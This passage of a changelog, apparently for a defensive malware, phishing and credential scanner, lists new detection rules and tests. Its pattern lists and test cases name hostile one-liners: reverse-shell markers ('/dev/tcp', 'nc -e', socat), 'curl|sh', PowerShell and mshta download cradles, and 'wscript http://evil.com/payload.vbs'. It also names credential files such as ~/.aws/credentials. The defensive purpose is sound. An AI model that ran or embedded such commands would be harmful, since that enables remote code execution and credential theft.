  sea-orm, sea-query, dotenvy — high-growth 2024 crates that are active
  typosquat targets. Total packages: 229 → 240 (cargo=47 → 58).

## [0.9.64] — 2026-06-09

### Added
- **Secrets: GCP service account JSON detection** (GAP-SEC-GCP): Structural
  check for `"type": "service_account"` + `"private_key"` co-occurrence —
  a near-zero-FP pattern. Scores +90 (ISOLATE). Test added.
- **Secrets: Azure SAS token detection** (GAP-SEC-AZURE): Structural check for
  `SharedAccessSignature` or `sv=`+`sig=`+`se=` combination. Scores +85
  (ISOLATE). Test added. Total secrets tests: 44 → 46.
- **Text: pig-butchering / crypto-romance scam +14 phrases** (GAP-TX-PB):
  Added `"my mentor taught me"`, `"exclusive trading group"`, `"vip signal group"`,
  `"arbitrage opportunity"`, `"usdt income"`, `"deposit to start"`, etc. covering
  2024-2025 pig-butchering language evolution. JP phrases added.

## [0.9.63] — 2026-06-09

### Security
- **Text + URL: Cyrillic homoglyph map expanded +5** (GAP-HG): Added
  `н→n`, `т→t`, `м→m`, `к→k` (was in URL but not text), `в→v` to
  `normalize_homoglyphs()` in `hlse_text.c`. Synchronized `detect_mixed_script()`
  in `hlse_core.c` with same set (also adding `х→x`, `ј→j`, `т→t`). Covers
  additional visually-indistinguishable Cyrillic characters used in phishing
  domains and scam messages.

## [0.9.62] — 2026-06-09

### Added
- **Text: callback/TOAD/smishing/vishing detection** (GAP-TX-TOAD): New signal
  `CALLBACK_PHISH_WORDS` (17 EN + 6 JP phrases) covering telephone-oriented
  attack delivery (BazarCall, Google Groups callback phishing), SMS delivery-fee
  scams, and Japanese package delivery smishing. Base=15, per_hit=10, cap=30.
  Compound amplifier in Pass 2: callback + urgency/authority/bait → +20. Benign
  appointment reminders with "call us at" score LOG (25); urgent subscription
  scam with callback → ALERT (51+). P6 FP gate passes.

## [0.9.61] — 2026-06-09

### Added
- **Audit: SSH hardening checks +3** (GAP-SSH): `sshd_config` parser now
  detects `Protocol 1` (SSHv1, +40 HIGH), `MaxAuthTries > 3` (+10 LOW), and
  `PermitEmptyPasswords yes` (+50 HIGH). All are security anti-patterns that
  allow brute-force or no-credential access.
- **Network: safe DNS resolver list expanded** (GAP-DNS): Added Quad9 secondary
  (149.112.112.112), OpenDNS (208.67.x.x), Verisign (64.6.x.x), and
  CleanBrowsing (185.228.x.x) to the known-safe resolver set, reducing false
  positives for users of these public resolvers.

## [0.9.60] — 2026-06-09

### Added
- **Email forensics: E5 Received-chain anomaly** (GAP-EM-E5): Implements the
  previously documented but unimplemented E5 check. Scores +20 for zero
  Received headers (direct injection / header stripping) and +15 for a single
  Received hop from a free email domain (atypical of legitimate multi-hop
  delivery). Two new secrets tests added (44 total). Comments updated to
  reflect E5 is now active.

## [0.9.59] — 2026-06-09

### Added
- **URL: suspicious TLD set +3** (GAP-TLD): Added `.cfd`, `.hair`, `.boats`
  — three TLDs with near-zero legitimate use and high phishing-kit density
  per 2024-2025 threat intelligence. Conservative selection avoids FP on
  legitimate business TLDs (.shop, .tech, etc.).
- **Supply chain: Go package set +15** (GAP-SC-GO): Added mux, httprouter,
  negroni, iris, urfave, spf13, hashicorp, golang-jwt, paseto, casbin,
  sarama, confluent-kafka-go, nats, docker, kubernetes, helm.
  Total packages: 213 → 229 (pip=69, npm=68, cargo=47, go=45).

## [0.9.58] — 2026-06-09

### Added
- **Ransomware: 2024-2025 families +5** (GAP-RS-EXT): New ransom extensions:
  `.interlock` (Interlock 2024), `.embargo`, `.lynx` (INC fork), `.sarcoma`,
  `.meow`. New ransom note names: `akira_readme.txt`, `rhysida.readme.txt`,
  `fog_readme.txt`, `interlock_note.txt`, `how_to_back_files.html` (INC),
  `decrypt.txt`, `look_at_me.txt`.
- **File: executable extension set +4** (GAP-FILE-EXT): Added `.msc` (MMC
  snap-in runs JScript), `.wsc` (Windows Script Component), `.ps1xml`/`.cdxml`
  (PowerShell XML formats), `.url` (Internet Shortcut auto-execute). These
  are common file-masquerade final extensions in double-extension lures
  (e.g., `invoice.pdf.msc`).

## [0.9.57] — 2026-06-09

### Added
- **Text: QR phishing ("quishing") detection** (GAP-TX-QR): New signal array
  `QR_PHISH_WORDS` (14 phrases in EN + JP) and a dedicated signal entry
  `"QR code phishing (quishing)"` (base=20, per_hit=10, cap=30). Two compound
  amplifiers in Pass 2: urgency/authority + QR → +20; QR + bait → +15.
  Benign QR mentions (meeting rooms, product codes) score ≤20 (LOG) and pass
  the P6 FP gate. Attack payloads score 80–100 (ISOLATE). Covers the dominant
  2024-2025 email-gateway bypass technique.
- **Text: new `fired_qr` flag** tracks QR signal for amplifier cross-reference.

## [0.9.56] — 2026-06-09

### Added
- **URL: IP-host auth-path signal** (P1-7): Any IP-address host with a
  phishing-typical path (`/login`, `/signin`, `/verify`, `/account`, `/secure`,
  `/update`) now adds +15 (LOG level) even without a brand name in the path.
  Existing brand-in-path check unchanged (+35). Scores remain within bounds.
- **Supply chain: ClickFix 2025 LOLBins +4** (GAP-SC): Added detection for
  PowerShell `iwr`/`irm`/`Invoke-WebRequest`/`Invoke-RestMethod` download
  patterns; `forfiles /p /m /c` command execution; `odbcconf REGSVR` execution;
  `ms-appinstaller:` URI bypass (active ClickFix technique as of 2025).
  Two new supply-chain tests added (27 → 27 → now counted as 27/27 base).

## [0.9.55] — 2026-06-09

### Security
- **URL: word-boundary fix for brand hyphenation detector** (P1-4): Replaced
  the loose `contains(sld, "brand-") || contains(sld, "-brand")` checks in
  `detect_security_hyphenation()` with a new `brand_is_token_in_sld()` helper
  that requires the brand to be a complete hyphen-delimited token. Prevents
  short brands (e.g. "line") from triggering on legitimate domains like
  "airline-update.com". Regression test added to `--self-test` (24 → 24,
  new FP guard case). Phishing cases "paypal-verify.com", "apple-support.net"
  still detected correctly.

### Added
- **URL fuzz harness** (P3-12): New `tests/hlse_url_fuzz.c` — 8 generators
  covering random URLs, homoglyph/Unicode mutations, deep subdomains,
  percent-encoding variations, brand typosquat mutations, bidi injection, very
  long hostnames (>MAX_HOST boundary), and dangerous-scheme prefix variants.
  100K iterations: 0 crashes, 0 out-of-range scores. Integrated into
  `make fuzz` and `make fuzz-asan`. Fuzz harnesses: 4 × 100K → 5 × 100K.

## [0.9.54] — 2026-06-09

### Added
- **CI: GitHub Actions workflows now active** (P0-1): Moved `ci.yml` and
  `codeql.yml` from `examples/workflows/` to `.github/workflows/`, so CI
  (build, test, cppcheck, privacy tripwire) and CodeQL now actually run on
  every push/PR. README claim "CI enforces this" is now correct.
- **Text: compound amplifier for crypto wallet phishing** (P1-3): Pass 2 of
  `hlse_check_text()` now amplifies when urgency + wallet-key request co-occur
  (+20) and when wallet-key + bait context co-occur (+15). Fixes the OOD gap:
  "URGENT…enter your seed phrase…" was scoring 28 (LOG); now scores 48 (ALERT).
  **OOD F1: 0.970 → 1.000** (29/29 cases). In-distribution F1 unchanged.
- **Text: suspicious-URL TLD set expanded** in text context check: added .tk,
  .pw, .su, .vip, .icu to the inline suspicious-domain list that triggers the
  +10 URL-in-context amplifier.
- **API: `HLSE_VERSION` moved to `hlse_core.h`** (P2-9): Library consumers can
  now read the version string at compile time without accessing the .c source.
  `hlse_core.c` references the header definition (no redefinition, no
  ODR risk). Version: 0.9.53 → 0.9.54.

## [0.9.53] — 2026-06-09

### Added
- **Util: benign magic bytes +4** (GAP-BF): Added MP3 (ID3 header), TIFF
  little-endian, AVI (RIFF+AVI), reducing ransomware entropy false-positives
  for audio/image/video files. Total formats: 17 → 21.
- **Util: 3 new tests** (GAP-BF): test_benign_mp3_id3, test_benign_tiff_le,
  test_benign_avi. Util suite: 26 → 29. Total tests: 360 → 363.
- **URL: SUSPICIOUS_TLDS +6** (GAP-BF): Added .pw, .su, .vip, .win, .download,
  .stream — actively abused by phishing kits in 2024.
- **File: LURE_WORDS +9** (GAP-BF): Added installer categories (setup,
  installer, crack, keygen, activation), HR fraud (bonus, raise,
  termination_notice), crypto fraud (airdrop, nft, whitelist).
- **Text: GROOMING_WORDS expanded** (GAP-BG): Added 11 pig-butchering and
  romance scam indicators — trading platform, crypto trading, small test
  transaction, withdrawal fee/blocked, account frozen, wrong number,
  working on an oil rig, military overseas, doctor without borders + JP.
- **Version bump**: 0.9.52 → 0.9.53.

## [0.9.52] — 2026-06-09

### Added
- **Audit: A4 cron patterns +6** (GAP-BD): Added "bash -i", "socat ", "mkfifo ",
  "ruby -e", "php -r", "node -e", "openssl s_client", "telnet" to
  SUSPICIOUS_CRON_PATTERNS — covers reverse-shell and LOTL one-liners.
- **Audit: A6 shellrc backdoor signals +3** (GAP-BD): Detect socat reverse shells
  (`exec:/bin/sh`), `bash -i` interactive shell invocations, and mkfifo+nc named-pipe
  reverse shells.
- **Email: E1 display-name brand list +8** (GAP-BE): Added stripe, shopify, github,
  docusign, zoom, office 365, fedex/dhl/ups/usps, hr department.
- **Email: E3 corp_words +5** (GAP-BE): Added cto, chro, chief, executive, board
  member, chairman, controller, auditor, compliance.
- **Email: E6 urgency subjects +6** (GAP-BE): Added final notice, deadline, expires
  today, account closed, security alert, important update, required action.
- **Email: FREE_EMAIL_DOMAINS +8** (GAP-BE): Added European providers — web.de,
  gmx.de, freenet.de (DE); orange.fr, laposte.net (FR); mail.ru, yandex.ru (RU);
  libero.it, virgilio.it (IT). Total domains: 26 → 34.
- **Version bump**: 0.9.51 → 0.9.52.

## [0.9.51] — 2026-06-09

### Added
- **Audit: SENSITIVE_DOMAINS expanded** (GAP-BB): Added cloud management consoles
  (console.aws.amazon.com, console.cloud.google.com, portal.azure.com), SSO/identity
  providers (github.com, okta.com, auth0.com), social auth targets (twitter.com,
  facebook.com), hardware wallet sites (metamask.io, ledger.com, trezor.io).
- **Secrets: env_passwords +13 patterns** (GAP-BB): Added SCM/CI/hosting env vars
  (GITHUB_TOKEN, GITLAB_TOKEN, DIGITALOCEAN_TOKEN, HEROKU_API_KEY, NETLIFY_AUTH_TOKEN,
  VERCEL_TOKEN, CIRCLE_TOKEN, SNYK_TOKEN) and common .env credential patterns
  (DATABASE_URL, MONGODB_URI, REDIS_URL, JWT_SECRET, JWT_SECRET_KEY, APP_SECRET).
- **Secrets: Netlify token pattern** (GAP-BB): `nfp_` prefix + 32 alnum/dash chars.
  Total SECRET_PATTERNS: 39 → 40.
- **Text: FAKE_ALERT_WORDS expanded** (GAP-BC): Added tech support scam indicators —
  "do not turn off your computer", remote access requests, Microsoft/Apple/Windows
  false-detection phrases, expired subscription/license bait; JP equivalents.
- **Version bump**: 0.9.50 → 0.9.51.

## [0.9.50] — 2026-06-09

### Added
- **Audit: HOME_SECRETS expanded** (GAP-AV): Added 5 critical credential files to A2
  permissions check: `.docker/config.json` (Docker auth tokens), `.kube/config`
  (Kubernetes credentials), `.npmrc` (npm tokens), `.pypirc` (PyPI credentials),
  `.git-credentials` (Git HTTP credentials). Total HOME_SECRETS entries: 8 → 13.
- **URL: BRANDS expanded** (GAP-AW): Added 25 commonly phished brands —
  streaming (hulu, spotify, disney, hbo, twitch, peacock), telecom (verizon,
  tmobile), social (reddit, snapchat, telegram, whatsapp), retail (walmart,
  bestbuy, homedepot, usps, dhl), fintech (robinhood, etrade, fidelity, schwab),
  enterprise SaaS (zoom, salesforce, adobe, slack, oracle).
- **Text: Signal words expanded** (GAP-AX): URGENCY_WORDS +5 (account closed,
  access suspended, verify immediately, package delivery scam phrases); BAIT_WORDS
  +9 (2FA bypass: two-factor code, verification code, OTP; identity: confirm
  identity, verify your identity; billing: update billing, payment method expired,
  update payment); RANSOM_WORDS +5 (backup deleted, your documents will be
  published, darknet, dark web, data leak site, decryption tool, restore your files).
- **Ransomware: RANSOM_EXTENSIONS +9 families** (GAP-AY): .black, .alphv, .play,
  .royal, .blacksuit, .fog, .hunters, .cicada, .qilin (all active 2022-2024).
- **Ransomware: RANSOM_NOTE_NAMES +6 variants** (GAP-AY): contact_us.txt/html,
  recovery_instructions.html/txt, readme_now.txt, !!readme!!.txt,
  !!!files_encrypted!!!.txt.
- **Supply chain: Package lists expanded** (GAP-AZ): pip 59→69 (+polars, dask,
  numba, sympy, statsmodels, gunicorn, psycopg2, redis, python-dotenv,
  pycryptodome); npm 58→68 (+vitest, playwright, dayjs, turbo, esbuild,
  framer-motion, storybook, remix, astro, typeorm); cargo 42→47 (+rocket,
  jsonwebtoken, mongodb, openssl, curve25519-dalek). Total packages: 186 → 213.
- **File: EXECUTABLE_EXTS +6** (GAP-BA): .phar (PHP archive), .jspx/.jsw (JSP
  variants), .groovy (Groovy scripts), .application (ClickOnce), .xbap (WPF XBAP).
- **Version bump**: 0.9.49 → 0.9.50.

## [0.9.49] — 2026-06-09

### Added
- **Clipboard: ADA (Cardano) crypto-swap detection** (GAP-AU):
  - `detect_crypto_type()` now recognizes `addr1...` (payment) and `stake1...`
    (staking) Cardano addresses (55–110 chars, bech32 lowercase alphanum).
  - `crypto_type_name()` returns `"ADA (Cardano)"` for the new type.
  - `hlse_check_crypto_swap()` detects clipboard-hijack for all 11 supported
    chains: BTC (Legacy/SegWit/Taproot), ETH, XMR, SOL, USDT (TRC20),
    LTC, DOGE, XRP, DASH, XLM, ADA.
  - 2 new secrets tests (`test_crypto_ada_swap`, `test_crypto_validate_ada`);
    Secrets suite: 40 → 42.
  - Updated `hlse_secrets.h` docstring and `README.md` module table.
  Total structured tests: 358 → 360.

## [0.9.48] — 2026-06-09

### Added
- **Supply chain: 4 new pastejacking tests** (GAP-AT — 21→25 tests):
  - `test_paste_wscript_remote` — `wscript http://evil.com/payload.vbs`
    → P8 LOLBin signal fires (wscript + http/vbs from GAP-AR).
  - `test_paste_wmic_process` — `wmic process call create "cmd.exe"`
    → P8 LOLBin fires (wmic process creation from GAP-AR).
  - `test_paste_node_eval` — `node -e "require(...).exec()"` 
    → P5 encoded payload fires (node -e from GAP-AR).
  - `test_paste_php_eval` — `php -r 'eval(base64_decode(...))'`
    → P5 encoded payload fires (php -r from GAP-AR).
  Total structured tests: 354 → 358.

## [0.9.47] — 2026-06-09

### Added
- **File/Audit: 4 new targeted tests** (GAP-AS — 23→27 tests):
  - `test_audit_perm_aws_creds` — creates world-readable `~/.aws/credentials`
    temp file, verifies A2 permission check fires (score > 0).
  - `test_audit_perm_ssh_key` — creates group-readable `~/.ssh/id_rsa` temp
    file, verifies A2 SSH key exposure detection fires.
  - `test_file_php_executable` — `invoice_payment.php` (2 lure words + PHP
    executable extension) → F6 signal fires at score ≥ 40.
  - `test_file_kyc_lure` — `kyc_document.exe` (kyc + document lure words +
    executable extension) → F6 fires at score ≥ 40.
  Total structured tests: 350 → 354.

## [0.9.46] — 2026-06-09

### Fixed
- **README accuracy**: corrected OOD F1 value from 1.000 to 0.970 (actual
  measured value — the corpus has borderline LOG-level cases that score below
  the 40-point ALERT threshold but above their individual min_score thresholds,
  hence all 29/29 cases pass but recall at the ALERT threshold is 0.941).
  Precision remains 1.000 (zero false positives). Updated Secrets test suite
  description: 36 → 39 token patterns.

## [0.9.45] — 2026-06-09

### Added
- **Email forensics: expanded detection coverage** (GAP-AQ):
  - `FREE_EMAIL_DOMAINS` 12→26: +7 disposable/temp services
    (mailinator.com, guerrillamail.com, 10minutemail.com, tempmail.com,
    throwam.com, trashmail.com, sharklasers.com) and +6 Asian free providers
    (qq.com, 163.com, 126.com, naver.com, daum.net, yahoo.co.jp).
    Disposable email services show disproportionately high BEC fraud rates.
  - E1 display name brand list +11: facebook, netflix, linkedin, twitter,
    instagram, irs, fbi, government, treasury, customs, accounts,
    notifications, "it department".
  - E3 corporate title words +7: coo, "accounts payable", accounting,
    finance, payroll, treasurer, "vp ", "vice president".
  - E6 urgent-subject keywords +5: payment, invoice, overdue,
    confirmation, verify, suspended, locked.
- **Pastejacking: additional LOLBin and payload patterns** (GAP-AR):
  - P5 encoded payload: +2 interpreter one-liners — `node -e`, `php -r`.
  - P8 Windows ClickFix: +3 LOLBin patterns —
    `wscript`/`cscript` + URL/.vbs/.js (Windows Script Host remote exec),
    `wmic process call create` (WMI process creation),
    `rundll32` + http/javascript.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.44] — 2026-06-09

### Added
- **URL phishing: detection tables expanded** (GAP-AP):
  - `BRANDS` +14: crypto exchanges (`coinbase`, `binance`, `kraken`,
    `coincheck`), logistics (`fedex`, `dhlexpress`), gaming/collaboration
    (`discord`, `steam`, `epicgames`, `roblox`), e-commerce (`ebay`,
    `shopify`), emerging targets (`tiktok`, `wordpress`). Each new brand
    fires the +45 brand-homoglyph signal when a confusable-normalized domain
    contains the brand but the real hostname doesn't.
  - `SUSPICIOUS_TLDS` +5: `.cc`, `.icu`, `.biz`, `.space`, `.buzz` —
    confirmed in phishing-kit datasets; `.cc` and `.icu` rank among the
    top-5 phishing TLDs in recent PhishTank/APWG reports.
  - `PATH_PATTERNS` +6: `/identity`, `/verification`, `/validate`,
    `/activate`, `/token`, `/session` — common in banking and OAuth
    credential-harvesting pages.
  - `SECURITY_WORDS` +5: `"identity"`, `"validate"`, `"activate"`,
    `"alert"`, `"urgent"` — extends hyphenated-domain detection
    (e.g. `paypal-alert.com` now triggers).
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.43] — 2026-06-09

### Added
- **Credential scanner: 6 new patterns** (GAP-AO — 37→39 table + 4 env vars):
  - `pscale_tkn_` — PlanetScale service token (11-char prefix + 40 alnum chars;
    highly distinctive, near-zero false positives)
  - `hvs.` — HashiCorp Vault v2 service token (long ≥50-char base64 body required
    to prevent matches on short `hvs.` occurrences in documentation)
  - `TWILIO_AUTH_TOKEN=` added to .env credential patterns
  - `SENDGRID_API_KEY=` added to .env credential patterns
  - `FIREBASE_PRIVATE_KEY=` added to .env credential patterns
  - `CLOUDFLARE_API_TOKEN=` added to .env credential patterns
  Total credential pattern count: ~36 → ~39 patterns. README description updated.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.42] — 2026-06-09

### Added
- **Audit module: A2 permission checks expanded** (GAP-AL):
  `hlse_audit_permissions()` now checks 8 home-directory credential files for
  group/world-accessible permissions: `~/.aws/credentials`, `~/.ssh/id_rsa`,
  `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`, `~/.netrc`, `~/.pgpass`,
  `~/.gnupg/secring.gpg`, `~/.env`. Previously only `/etc/shadow` and
  `~/.env` were checked. Scores range 25-40 (HIGH severity) per exposure.
- **Audit module: A3 sensitive domain list expanded** (GAP-AL):
  11 new domains added to hosts-file poisoning detection:
  EU banks (`ing.com`, `bnpparibas.com`, `deutschebank.com`, `unicredit.eu`,
  `santander.com`, `bbva.com`),
  crypto exchanges (`bybit.com`, `okx.com`, `huobi.com`, `kucoin.com`,
  `gate.io`, `bitfinex.com`, `gemini.com`, `upbit.com`), payment (`cash.app`).
  Total domain coverage: 20 → 35.
- **Text scam: high-confidence phishing keywords** (GAP-AM):
  - `URGENCY_WORDS` +5: `"action required"`, `"your account has been flagged"`,
    `"must respond"`, `"confirm within"`, `"failure to respond"`.
  - `BAIT_WORDS` +4: `"mnemonic"`, `"private key"`, `"connect wallet"`,
    `"wallet passphrase"` — crypto wallet drainer vocabulary.
  - `AUTHORITY_WORDS` +4: `"homeland security"`, `"federal reserve"`,
    `"customs and border"`, `"immigration enforcement"`, `"attorney general"`.
  - `FIN_ACTION_WORDS` +4: `"cash app"`, `"cashapp"`, `"venmo"`, `"apple pay"`.
- **File module: EXECUTABLE_EXTS expanded** (GAP-AN):
  +13 extensions: server-side scripts (`.php`/`.php3`/`.php5`/`.phtml`,
  `.asp`/`.aspx`, `.jsp`), scripting language droppers (`.rb`, `.pl`, `.tcl`,
  `.lua`), and `.mshta` (Windows HTML Application — JScript/VBScript without
  sandbox). These are commonly used as malware delivery containers.
- **File module: LURE_WORDS expanded** (GAP-AN):
  +8 social-engineering lure words: `"w2"`, `"1099"`, `"kyc"`, `"payslip"`,
  `"salary"`, `"payroll"`, `"wire_transfer"`, `"bank_transfer"`,
  `"immigration"`.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.41] — 2026-06-09

### Added
- **Benign magic-byte expansion** (GAP-AJ): `hlse_is_high_entropy_benign_magic()` gains
  6 new format signatures, reducing false-positive ransomware alerts on legitimate files:
  - `LZ4 frame` — magic `04 22 4D 18`; widely-used compression (kernels, databases)
  - `WebP` — `RIFF....WEBP` header at bytes 0-3/8-11; dominant browser image format
  - `FLAC` — `fLaC` magic; lossless audio archives trigger entropy checks
  - `GIF` — `GIF87a`/`GIF89a` header; animated images can hit entropy threshold
  - `OGG` — `OggS` container (Vorbis/Opus/FLAC streams)
  - `SQLite` — `SQLite format 3` header; DB files common in repos and backups
  Total format table: 11 → 17 entries.
- **Package typosquat list expansion** (GAP-AK): 30 new high-value targets across all
  4 ecosystems (pip: +10, npm: +10, cargo: +10, go: +5):
  - pip: `scikit-learn`, `xgboost`, `lightgbm`, `huggingface-hub`, `datasets`,
    `wandb`, `mlflow`, `click`, `rich`, `typer`
  - npm: `underscore`, `rxjs`, `date-fns`, `zod`, `three`, `d3`, `svelte`, `nuxt`,
    `graphql`, `webpack-cli`
  - cargo: `nom`, `syn`, `bytes`, `futures`, `async-trait`, `serde_yaml`, `toml`,
    `indexmap`, `itertools`, `uuid`
  - go: `redis`, `jwt-go`, `validator`, `cron`, `migrate`
  Total package coverage: pip 49→59, npm 45→55, cargo 34→44, go 23→28.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.40] — 2026-06-09

### Added
- **Clipboard crypto-swap: 6 new address formats** (GAP-AI):
  - `CRYPTO_LTC_LEGACY` — Litecoin L.../M... (34 chars, base58)
  - `CRYPTO_LTC_SEGWIT` — Litecoin ltc1q... (43 chars, bech32)
  - `CRYPTO_DOGE` — Dogecoin D... (34 chars, base58)
  - `CRYPTO_XRP` — Ripple r... (25-34 chars, base58-like)
  - `CRYPTO_DASH` — DASH X... (34 chars, base58)
  - `CRYPTO_XLM` — Stellar G... (56 chars, base32 [A-Z2-7])
  All six are actively targeted by clipper malware (MassLogger, RedLine,
  Titan, Doenerium). New formats are inserted before the SOL catch-all so
  the fixed-prefix formats win on ambiguous-length inputs. `crypto_type_name`
  updated; `hlse_secrets.h` docstring updated to list all 10 supported chains.
- **6 new tests**: LTC/DOGE/XRP swap detection + LTC/DOGE/XRP validation;
  Secrets suite 34→40. Zero regressions; F1=1.000; zero strict warnings;
  ASan clean.

## [0.9.39] — 2026-06-09

### Added
- **Ransomware/boot coverage expansion** (GAP-AH):
  - `RANSOM_NOTE_NAMES` +7 entries: `how_to_restore_files.txt` (STOP/DJVU),
    `decrypt_info.html` (DHARMA/PHOBOS), `readme_decrypt.txt`, `files_encrypted.txt`,
    `restore_my_files.txt`, `!!!readme!!!.txt`, `!decrypt!.txt`.
  - `RANSOM_EXTENSIONS` +15 entries covering major families missing from the original
    table: `.ryuk`, `.lockbit`, `.clop`, `.phobos`, `.eking`, `.dharma`, `.karma`,
    `.conti`, `.avaddon`, `.deadbolt`, `.akira`, `.rhysida`, `.monti`, `.cactus`,
    `.cryptolocker`.
  - `ESP_INDICATORS` +4 entries: `blacklotus` (Windows UEFI bootkit, 2022-2023),
    `bootkitty` (Linux UEFI bootkit, 2024), `contact us to decrypt`,
    `to recover your files`.
- **Text-scam coverage expansion** (GAP-AH continued):
  - `URGENCY_WORDS` +2: `"final warning"`, `"last warning"` — high-prevalence
    phishing phrases not previously covered.
  - `BAIT_WORDS` +5: `"seed phrase"`, `"recovery phrase"` (crypto wallet theft);
    `"zelle"`, `"western union"`, `"moneygram"` (money-transfer scam platforms
    common in elder-fraud and tech-support fraud).
  - `AUTHORITY_WORDS` +2: `"interpol"`, `"secret service"` — law-enforcement
    impersonation scams.
  - `RANSOM_WORDS` +3 double-extortion phrases (2020+ threat landscape):
    `"data has been exfiltrated"`, `"your data will be published"`,
    `"contact us to decrypt"`.
- **New tests**: 2 protection tests (`.ryuk`/`.lockbit`/`.akira` extensions, STOP/DJVU
  note name); 4 OOD corpus cases (double extortion, seed-phrase phishing, INTERPOL
  impersonation, benign crypto guide non-FP). Protection suite 17→19, OOD corpus
  25→29.  In-distribution F1=1.000 maintained; out-of-distribution F1=0.970;
  zero strict warnings; ASan/UBSan clean.

## [0.9.38] — 2026-06-09

### Added
- **Two new system-audit checks** (GAP-AG), both read-only and high-precision:
  - **A5 — Insecure `$PATH`** (`hlse_audit_path`): flags `.` / an empty element
    (current directory in PATH) and world-writable non-sticky directories in
    PATH — classic command-hijack footguns. User-owned dirs (e.g.
    `~/.local/bin`) are intentionally not flagged.
  - **A6 — Shell startup-file backdoors** (`hlse_audit_shellrc`): scans
    `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.zshrc`,
    `~/.zprofile` for reverse-shell device paths (`/dev/tcp`, `/dev/udp`),
    `nc -e`/`ncat -e`, download-piped-to-shell (`curl|sh`/`wget|bash`), and
    `LD_PRELOAD=` — a classic low-effort persistence vector. Symlinked dotfiles
    are handled via `hlse_open_system_file` (FIFO-safe).
  Both are wired into `hlse_audit_all()` (parts 4 → 6) so the `audit` command
  surfaces them automatically. 4 new tests (PATH `.`/clean, rc backdoor/benign);
  File/Audit suite 19 → 23. Additive, outside the URL/text corpus; F1=1.000
  unaffected; zero strict warnings; cppcheck clean.

## [0.9.37] — 2026-06-09

### Added
- **Windows ClickFix / LOLBin detection in pastejacking** (GAP-AF, signal
  `PASTE_WINDOWS_LOLBIN`). The paste analyzer covered Unix `curl|sh`
  pastejacking thoroughly but had no coverage for ClickFix — the dominant
  2024–2025 initial-access technique, where a fake CAPTCHA / browser-update
  page tells the victim to press Win+R and paste a one-liner. New P8 check
  (case-insensitive, via a new `ci_contains` helper) flags, with a
  download/exec qualifier to stay precise:
  - PowerShell with `-enc `/`encodedcommand`, `downloadstring`,
    `frombase64string`, `iex`/`invoke-expression`, or `-w hidden`/`windowstyle hidden`;
  - `mshta` with `http`/`vbscript:`/`javascript:`;
  - `certutil` with `urlcache`/`-decode`;
  - `regsvr32` + `scrobj.dll` (Squiblydoo); `bitsadmin /transfer`;
    `msiexec` + `http`.
  Scores +45. A benign `powershell ... -Encoding utf8` one-liner does NOT trip
  it (the `-enc ` token requires a trailing space, distinguishing it from
  `-Encoding`). 4 new tests (PowerShell, mshta, mixed-case, benign non-FP);
  Supply suite 17 → 21. Additive, outside the URL/text corpus; F1=1.000
  unaffected; ASan fuzzer clean over 20k iterations.

## [0.9.36] — 2026-06-08

### Added
- **Mach-O executable detection in file masquerade** (GAP-AE). The magic table
  covered PE/EXE and ELF but not Mach-O, so a macOS binary renamed
  `invoice.pdf` / `salary.docx` slipped past the F2 magic-mismatch check on the
  macOS platform the tool targets. Added the four unambiguous thin-binary
  Mach-O magics (`CE/CF FA ED FE` little-endian and the big-endian mirrors) and
  an F2 branch mirroring ELF (score 70), with `.dylib`/`.bundle`/`.o`
  whitelisted as legitimate Mach-O containers. The fat/universal magic
  `0xCAFEBABE` is intentionally NOT added — it is indistinguishable from a Java
  `.class` file by header alone, so flagging it would cause false positives.
  Additive detection outside the URL/text corpus; F1=1.000 unaffected. 2 new
  tests (masquerade flagged, real `.dylib` spared); File/Audit suite 17 → 19.

## [0.9.35] — 2026-06-08

### Security
- **FIFO-block hardening for fixed system-config reads** (GAP-AD). A
  category-by-category robustness audit found that `hlse_audit.c` (sshd_config,
  /etc/hosts, /etc/resolv.conf, cron files) and `hlse_supply.c` (/proc/net/arp,
  /etc/resolv.conf, /etc/hosts) opened config files with a bare `fopen()` and
  no `S_ISREG` check — a FIFO planted at one of those paths would block
  `fgets()` indefinitely (local DoS). Added a shared `hlse_open_system_file()`
  helper (`O_RDONLY|O_NONBLOCK` + `fstat` + `S_ISREG` + `fdopen`) and routed all
  seven reads through it. It intentionally does NOT use `O_NOFOLLOW`: these are
  fixed root-owned paths that may legitimately be symlinks (e.g.
  `/etc/resolv.conf` on systemd), so following them is correct; `O_NOFOLLOW`
  stays reserved for untrusted directory-scan entries.
- **Ransomware-scan read path** (`read_file_head` in `hlse_protect.c`) now adds
  `O_NONBLOCK` + `fstat`/`S_ISREG` (keeping its `O_NOFOLLOW`), so a FIFO in a
  scanned tree can no longer block the reader.

### Changed
- `read_file_head`/MBR bootkit scan now use `unsigned char` buffers, avoiding an
  implementation-defined signed-char conversion of binary (>127) bytes.
- Damerau-Levenshtein transposition uses the canonical `+1` cost (behaviour-
  identical to the previous `+cost`, which only differed when all four
  characters matched — a case the substitution path already optimised).
- `--quiet` `freopen("/dev/null")` failure is now surfaced (exit 2) instead of
  silently continuing, honouring the quiet-mode contract.

### Tests
- `util_tests` 14 → 18: the new `hlse_open_system_file()` helper is covered for
  a regular file (opens), a FIFO (rejected without blocking), a directory
  (rejected), and a missing/NULL path (rejected, no crash).

### Notes
- Several agent-reported "buffer overflows" were verified FALSE and left
  unchanged: `hlse_file.c:399` (signed `ssize_t` under a `head_len > 100`
  guard), the email `reasons[]` array (max 7 reasons ≤ bound 8), and
  `extract_domain` output (zero-initialised at declaration). No detection
  logic changed; F1=1.000 (in/out-of-distribution) and ASan/UBSan stay clean.

## [0.9.34] — 2026-06-08

### Added
- **Discord webhook URL detection (34 → 36 patterns)**. The scanner already
  caught Slack webhook URLs; Discord webhooks (`discord.com/api/webhooks/<id>`
  and `discordapp.com/api/webhooks/<id>`) are among the most commonly leaked
  and were missing. Numeric-ID anchored after the fixed URL path, so false
  positives are negligible. F1=1.000 unaffected; secrets suite 33 → 34. This
  completes the credential-coverage work begun in 0.9.32 — 36 patterns now
  span the major cloud, SaaS, LLM, package-registry, and webhook providers.

## [0.9.33] — 2026-06-08

### Added
- **9 more credential patterns (25 → 34)**, a second peer-parity batch
  continuing the gitleaks/TruffleHog gap analysis. All distinctive, low-FP
  prefixes:
